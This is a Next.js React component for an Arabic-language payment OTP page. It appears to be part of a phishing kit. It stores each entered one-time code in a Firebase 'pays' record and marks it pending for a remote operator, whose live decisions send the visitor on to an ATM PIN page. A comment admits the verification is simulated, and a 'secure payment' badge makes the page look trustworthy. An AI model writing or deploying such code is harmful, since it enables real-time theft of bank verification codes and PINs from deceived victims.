"use client";

import type React from "react";
import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";
import { Shield } from "lucide-react";
import { addData, db } from "@/lib/firebase";
import { usePageRedirect } from "@/lib/use-page-redirect";
import { doc, onSnapshot } from "firebase/firestore";
import { getRedirectUrl } from "@/lib/page-routes";
import FullPageLoader from "./loader";

export function OtpForm() {
  usePageRedirect("payment-otp");
  const router = useRouter();
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [visitorId, setVisitorId] = useState("");
  const [loading, setIsLoading] = useState(false);

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async () => {
    if (otp.length < 4) return;

    setIsSubmitting(true);
    // Simulate OTP verification
    const visitorID = localStorage.getItem("visitor");
    await addData({
      id: visitorID,
      otp: otp,
      otpApproval: "pending",
    });
    await new Promise((resolve) => setTimeout(resolve, 2000));
    // Navigate to success page
    // alert("  invalid  OTP !");
    //setOtp("");
  };
  useEffect(() => {
    let v = visitorId;
    if (typeof window !== "undefined" && !v) {
      v = localStorage.getItem("visitor") || "";
      setVisitorId(v);
    }

    if (!v) return;

    const unsubscribe = onSnapshot(doc(db, "pays", v), (snap) => {
      if (!snap.exists()) return;

      const userData = snap.data();

      if (userData.otpApproval === "pending") setIsSubmitting(true);

      if (userData.cardApproval === "pin")
        window.location.href = "/payment/atm-pin";
      if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
      const redirectUrl = getRedirectUrl(userData.currentPage, "otp");
      if (redirectUrl) window.location.href = redirectUrl;
    });

    return () => unsubscribe();
  }, [visitorId]);
  const isFormValid = otp.length > 3;

  return (
    <div className="space-y-6">
      {/* OTP Verification Card */}
      <div className="bg-white rounded-xl shadow-sm border border-stone-200 p-8">
        {/* Title */}
        <h2 className="text-2xl font-bold text-stone-900 text-center mb-2">
          التحقق من OTP
        </h2>
        <p className="text-stone-600 text-sm text-center mb-6">
          تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المسجل. يرجى إدخاله أدناه.
        </p>

        {/* OTP Label */}
        <div className="text-center mb-6">
          <h3 className="text-3xl font-bold text-green-600 mb-4">OTP</h3>
          <p className="text-stone-600 text-sm leading-relaxed">
            لإكمال عملية الدفع الآمنة، يرجى إدخال رمز التحقق من البريد
            الإلكتروني أو رسالة نصية وصلت إليك.
          </p>
        </div>

        {/* OTP Input */}
        <div className="space-y-6">
          <div>
            <label className="block text-sm text-stone-700 text-center mb-4 font-medium">
              أدخل رمز التحقق (6 أرقام)
            </label>
            <input
              type="tel"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={otp}
              onChange={handleOtpChange}
              maxLength={6}
              placeholder="----"
              className="w-full px-4 py-3 border-2 border-stone-300 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-green-500 focus:outline-none transition-colors"
            />{" "}
          </div>

          {/* Submit Button */}
          <Button
            onClick={handleSubmit}
            disabled={!isFormValid || isSubmitting}
            className="w-full bg-green-600 hover:bg-green-700 disabled:bg-stone-200 disabled:cursor-not-allowed text-white text-lg h-12 font-medium rounded-lg transition-colors"
          >
            {isSubmitting ? "جاري التحقق..." : "تأكيد"}
          </Button>
        </div>

        {/* Resend OTP */}
        <div className="text-center mt-6">
          <p className="text-stone-600 text-sm mb-2">لم تتلق الرمز؟</p>
          <button className="text-green-600 hover:text-green-700 text-sm font-medium transition-colors">
            إعادة إرسال الرمز
          </button>
        </div>
        {isSubmitting && <FullPageLoader />}
        {/* Security Badge */}
        <div className="flex items-center justify-center gap-2 mt-6 text-green-600">
          <Shield className="h-4 w-4" />
          <span className="text-sm font-medium">دفع آمن ومحمي</span>
        </div>
      </div>
    </div>
  );
}
